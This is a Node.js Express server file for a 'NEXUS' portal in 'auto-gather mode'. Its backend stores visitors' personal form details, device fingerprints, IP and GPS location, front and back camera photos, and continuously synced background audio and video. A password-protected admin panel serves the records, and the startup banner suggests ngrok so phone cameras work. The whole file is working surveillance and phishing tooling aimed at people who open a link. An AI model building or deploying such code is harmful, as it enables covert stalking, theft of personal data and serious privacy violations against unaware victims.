// ─────────────────────────────────────────────────────────────
//  NEXUS // Backend — Auto-Gather Mode
// ─────────────────────────────────────────────────────────────
const express = require("express");
const path = require("path");
const fs = require("fs");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "150mb" }));
app.use(express.urlencoded({ extended: true, limit: "150mb" }));
app.set("trust proxy", true);
app.use(express.static(path.join(__dirname, "public")));

// ── Database Setup (sql.js) ──────────────────────────────────
const DB_PATH = process.env.VERCEL ? path.join("/tmp", "records.db") : path.join(__dirname, "data", "records.db");
let db;

async function initDB() {
  const initSqlJs = require("sql.js");
  const SQL = await initSqlJs();

  if (fs.existsSync(DB_PATH)) {
    const fileBuffer = fs.readFileSync(DB_PATH);
    db = new SQL.Database(fileBuffer);
  } else {
    db = new SQL.Database();
  }

  db.run(`
    CREATE TABLE IF NOT EXISTS captures (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      -- Device metadata
      timestamp_open  TEXT,
      os              TEXT,
      browser         TEXT,
      browser_version TEXT,
      device_type     TEXT,
      screen_res      TEXT,
      language        TEXT,
      platform        TEXT,
      user_agent      TEXT,
      -- Form data
      form_name       TEXT,
      form_email      TEXT,
      form_phone      TEXT,
      form_dob        TEXT,
      -- Network (server-side)
      ip_address      TEXT,
      ip_city         TEXT,
      ip_region       TEXT,
      ip_country      TEXT,
      ip_lat          REAL,
      ip_lon          REAL,
      ip_isp          TEXT,
      ip_org          TEXT,
      ip_timezone     TEXT,
      -- Browser geolocation (client-side)
      geo_lat         REAL,
      geo_lon         REAL,
      geo_accuracy    REAL,
      -- Camera captures (base64)
      front_image     TEXT,
      back_image      TEXT,
      -- Audio recording (base64)
      audio_recording TEXT,
      -- Video recording (base64)
      video_recording TEXT,
      -- Record timestamp
      created_at      TEXT DEFAULT (datetime('now'))
    );
  `);

  try {
    db.run("ALTER TABLE captures ADD COLUMN video_recording TEXT;");
  } catch (_) {
    // Column already exists
  }

  saveDB();
}

function saveDB() {
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
  fs.writeFileSync(DB_PATH, buffer);
}

// ── Resolve client IP ────────────────────────────────────────
function getClientIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.ip || req.socket.remoteAddress || "unknown";
}

// ── Check if IP is private/loopback ──────────────────────────
function isPrivateIP(ip) {
  const clean = ip.replace("::ffff:", "");
  return (
    clean === "::1" || clean === "127.0.0.1" || clean === "localhost" ||
    /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(clean) ||
    clean === "unknown"
  );
}

// ── Get real public IP when behind localhost ──────────────────
async function getPublicIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || null;
  } catch (err) {
    console.error("Public IP fetch error:", err.message);
    return null;
  }
}

// ── Fetch geolocation from ip-api.com ────────────────────────
async function fetchGeoLocation(ip) {
  let cleanIP = ip.replace("::ffff:", "");

  // If the IP is local/private, resolve the real public IP first
  if (isPrivateIP(cleanIP)) {
    const publicIP = await getPublicIP();
    if (publicIP) {
      cleanIP = publicIP;
      ip = publicIP; // update for the caller
    }
  }

  try {
    const res = await fetch(
      `http://ip-api.com/json/${cleanIP}?fields=status,city,regionName,country,lat,lon,isp,org,timezone`
    );
    const data = await res.json();
    if (data.status === "success") {
      return {
        resolvedIP: cleanIP,
        city: data.city || "",
        region: data.regionName || "",
        country: data.country || "",
        lat: data.lat || null,
        lon: data.lon || null,
        isp: data.isp || "",
        org: data.org || "",
        timezone: data.timezone || "",
      };
    }
  } catch (err) {
    console.error("Geolocation API error:", err.message);
  }
  return { resolvedIP: null, city: "", region: "", country: "", lat: null, lon: null, isp: "", org: "", timezone: "" };
}

// ── POST /api/capture — auto-gather endpoint ────────────────
app.post("/api/capture", async (req, res) => {
  try {
    const {
      timestamp_open, os, browser, browser_version, device_type,
      screen_res, language, platform, user_agent,
      form_name, form_email, form_phone, form_dob,
      geo_lat, geo_lon, geo_accuracy,
      client_ip,
      front_image, back_image, audio_recording, video_recording,
    } = req.body;

    const raw_ip = client_ip || getClientIP(req);
    const geo = await fetchGeoLocation(raw_ip);
    
    let base_ip = geo.resolvedIP || raw_ip;
    const device_ip = req.body.device_ip;
    
    // Combine public and local IPs for maximum accuracy
    const ip_address = device_ip ? `${base_ip} | Local: ${device_ip}` : base_ip;

    const openDate = timestamp_open ? new Date(timestamp_open) : new Date();
    const openIST = openDate.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
    const createdIST = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";

    db.run(
      `INSERT INTO captures (
        timestamp_open, os, browser, browser_version, device_type,
        screen_res, language, platform, user_agent,
        form_name, form_email, form_phone, form_dob,
        ip_address, ip_city, ip_region, ip_country, ip_lat, ip_lon, ip_isp, ip_org, ip_timezone,
        geo_lat, geo_lon, geo_accuracy,
        front_image, back_image, audio_recording, video_recording, created_at
      ) VALUES (?,?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?,?,?,?,?,?, ?,?,?, ?,?,?,?,?)`,
      [
        openIST,
        os || "Unknown", browser || "Unknown", browser_version || "",
        device_type || "Unknown",
        screen_res || "", language || "", platform || "", user_agent || "",
        form_name || "", form_email || "", form_phone || "", form_dob || "",
        ip_address,
        geo.city, geo.region, geo.country, geo.lat, geo.lon, geo.isp, geo.org, geo.timezone,
        geo_lat || null, geo_lon || null, geo_accuracy || null,
        front_image || null, back_image || null, audio_recording || null, video_recording || null,
        createdIST,
      ]
    );

    saveDB();

    const result = db.exec("SELECT MAX(id) AS id FROM captures");
    const recordId = result[0]?.values[0]?.[0] ?? "?";

    console.log(`[◆] Capture #${recordId} — ${ip_address} | ${os} ${browser} | ${geo.city}, ${geo.country}`);

    // Return ALL collected data so the frontend can display it
    return res.json({
      success: true,
      recordId,
      data: {
        ip_address,
        ip_city: geo.city,
        ip_region: geo.region,
        ip_country: geo.country,
        ip_lat: geo.lat,
        ip_lon: geo.lon,
        ip_isp: geo.isp,
        ip_org: geo.org,
        ip_timezone: geo.timezone,
      },
    });
  } catch (err) {
    console.error("Capture error:", err);
    return res.status(500).json({ success: false, message: "Internal server error." });
  }
});

// ── POST /api/capture/:id/audio — continuous background audio sync ──
app.post("/api/capture/:id/audio", (req, res) => {
  try {
    const { audio_recording } = req.body;
    const id = parseInt(req.params.id);
    if (!audio_recording || isNaN(id)) {
      return res.status(400).json({ success: false, message: "Invalid audio payload." });
    }
    db.run("UPDATE captures SET audio_recording = ? WHERE id = ?", [audio_recording, id]);
    saveDB();
    return res.json({ success: true, message: "Audio updated." });
  } catch (err) {
    console.error("Audio update error:", err);
    return res.status(500).json({ success: false, message: "DB Error" });
  }
});

// ── POST /api/capture/:id/video — continuous background video sync ──
app.post("/api/capture/:id/video", (req, res) => {
  try {
    const { video_recording } = req.body;
    const id = parseInt(req.params.id);
    if (!video_recording || isNaN(id)) {
      return res.status(400).json({ success: false, message: "Invalid video payload." });
    }
    db.run("UPDATE captures SET video_recording = ? WHERE id = ?", [video_recording, id]);
    saveDB();
    return res.json({ success: true, message: "Video updated." });
  } catch (err) {
    console.error("Video update error:", err);
    return res.status(500).json({ success: false, message: "DB Error" });
  }
});

// ── Admin Password ───────────────────────────────────────────
const ADMIN_PASS = "bliss @MITM";
const ALLOWED_ADMIN_PASSES = ["bliss @MITM", "bliss@MITM"];

function checkAdmin(req, res) {
  const pass = req.headers["x-admin-pass"] || req.query.pass;
  if (!pass || !ALLOWED_ADMIN_PASSES.includes(pass.trim())) {
    res.status(401).json({ success: false, message: "Unauthorized" });
    return false;
  }
  return true;
}

// ── GET /api/admin/records — admin listing (no images/audio for speed) ──
app.get("/api/admin/records", (req, res) => {
  if (!checkAdmin(req, res)) return;
  try {
    const stmt = db.prepare(`
      SELECT id, timestamp_open, os, browser, browser_version, device_type,
             screen_res, language, platform,
             form_name, form_email, form_phone, form_dob,
             ip_address, ip_city, ip_region, ip_country, ip_lat, ip_lon, ip_isp, ip_org, ip_timezone,
             geo_lat, geo_lon, geo_accuracy,
             created_at
      FROM captures ORDER BY id DESC
    `);
    const records = [];
    while (stmt.step()) records.push(stmt.getAsObject());
    stmt.free();
    return res.json({ success: true, count: records.length, records });
  } catch (err) {
    console.error("Fetch records error:", err);
    return res.status(500).json({ success: false, message: "Internal server error." });
  }
});

// ── GET /api/admin/record/:id — full record with images + audio ──
app.get("/api/admin/record/:id", (req, res) => {
  if (!checkAdmin(req, res)) return;
  try {
    const stmt = db.prepare("SELECT * FROM captures WHERE id = ?");
    stmt.bind([parseInt(req.params.id)]);
    if (stmt.step()) {
      const record = stmt.getAsObject();
      stmt.free();
      return res.json({ success: true, record });
    }
    stmt.free();
    return res.status(404).json({ success: false, message: "Record not found." });
  } catch (err) {
    console.error("Fetch record error:", err);
    return res.status(500).json({ success: false, message: "Internal server error." });
  }
});

// ── POST /api/admin/clear — clear all logs ──
app.post("/api/admin/clear", (req, res) => {
  if (!checkAdmin(req, res)) return;
  try {
    db.run("DELETE FROM captures");
    saveDB();
    return res.json({ success: true, message: "Logs cleared." });
  } catch (err) {
    console.error("Admin clear error:", err);
    return res.status(500).json({ success: false, message: "DB Error" });
  }
});

// ── DELETE /api/admin/record/:id — delete a specific record ──
app.delete("/api/admin/record/:id", (req, res) => {
  if (!checkAdmin(req, res)) return;
  try {
    db.run("DELETE FROM captures WHERE id = ?", [parseInt(req.params.id)]);
    saveDB();
    return res.json({ success: true, message: "Record deleted." });
  } catch (err) {
    console.error("Delete record error:", err);
    return res.status(500).json({ success: false, message: "DB Error" });
  }
});

// ── PUT /api/admin/record/:id — edit a specific record ──
app.put("/api/admin/record/:id", (req, res) => {
  if (!checkAdmin(req, res)) return;
  try {
    const { form_name, form_email, form_phone, form_dob } = req.body;
    db.run(
      `UPDATE captures SET form_name = ?, form_email = ?, form_phone = ?, form_dob = ? WHERE id = ?`,
      [form_name, form_email, form_phone, form_dob, parseInt(req.params.id)]
    );
    saveDB();
    return res.json({ success: true, message: "Record updated." });
  } catch (err) {
    console.error("Update record error:", err);
    return res.status(500).json({ success: false, message: "DB Error" });
  }
});

// ── HEAD /api/alive — health check ──
app.head("/api/alive", (req, res) => {
  res.status(200).end();
});

// ── GET /api/alive — health check (optional but good practice) ──
app.get("/api/alive", (req, res) => {
  res.status(200).send("alive");
});

app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ── Start ────────────────────────────────────────────────────
initDB().then(() => {
  app.listen(PORT, () => {
    console.log(`
  ┌──────────────────────────────────────────────┐
  │   NEXUS PORTAL running on port ${PORT}           │
  │   http://localhost:${PORT}                       │
  │                                              │
  │   For HTTPS / mobile camera:                 │
  │   npx ngrok http ${PORT}                         │
  └──────────────────────────────────────────────┘
    `);
  });
});
